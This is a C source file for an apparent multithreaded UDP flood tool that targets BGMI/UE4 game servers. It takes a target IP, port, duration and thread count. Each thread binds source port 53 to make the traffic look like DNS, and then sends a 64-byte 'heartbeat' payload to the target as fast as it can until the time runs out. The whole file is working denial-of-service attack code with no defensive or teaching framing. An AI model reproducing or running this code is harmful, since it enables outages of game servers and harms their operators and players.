#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

// 🛡️ UE4 Heartbeat Hex String (Bullet-Proof Signature)
unsigned char bgmi_payload[] = {
    0x01, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x55, 0x45, 0x34, 0x56, // UE4V
    0x01, 0x02, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00,
    0x0d, 0x0e, 0x0a, 0x0d, 0x00, 0x00, 0x00, 0x00,
    0x70, 0x69, 0x6e, 0x67, 0x00, 0x00, 0x00, 0x00, // "ping"
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr, source_addr;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // 1. DNS Masking (Port 53)
    memset(&source_addr, 0, sizeof(source_addr));
    source_addr.sin_family = AF_INET;
    source_addr.sin_port = htons(53); 
    source_addr.sin_addr.s_addr = INADDR_ANY;
    bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));

    // 2. Kernel Speed Boost
    int buf_size = 2 * 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    time_t end_time = time(NULL) + data->duration;

    // 🚀 STRIKE LOOP (Max PPS)
    while (time(NULL) < end_time) {
        // Send Bullet-Proof Hex Payload
        sendto(sock, bgmi_payload, 64, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }
    
    close(sock);
    free(data);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) return 1;

    int threads_count = atoi(argv[4]);
    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));

    for (int i = 0; i < threads_count; i++) {
        struct thread_data *t_data = malloc(sizeof(struct thread_data));
        strcpy(t_data->ip, argv[1]);
        t_data->port = atoi(argv[2]);
        t_data->duration = atoi(argv[3]);
        pthread_create(&thread_id[i], NULL, prime_strike, t_data);
    }

    for (int i = 0; i < threads_count; i++) pthread_join(thread_id[i], NULL);
    free(thread_id);
    return 0;
}
